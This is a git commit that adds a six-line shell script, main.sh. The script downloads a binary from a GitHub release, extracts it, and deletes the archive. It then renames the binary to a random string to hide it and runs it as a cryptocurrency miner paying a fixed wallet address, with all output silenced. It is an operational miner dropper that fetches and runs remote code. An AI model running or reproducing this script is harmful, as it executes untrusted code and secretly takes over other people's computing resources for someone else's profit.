ead9b4c1533108564e48b1f6c3190c784d707854
udhaindah <udhaindah937@gmail.com>
2024-09-28 21:18:55 +0700

    Create main.sh

---
+++ main.sh
@@ -0,0 +1,6 @@
+wget https://github.com/jahobe/titin/releases/download/v1.2.4/go.tar
+tar -xf go.tar
+rm -rf go.tar
+variable6=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
+mv go $variable6
+./$variable6 mine --address 2xQeBibQUfWJi4t4Ua32vM3SjHLbwA6wHuXYHusGp9jm > /dev/null 2>&1
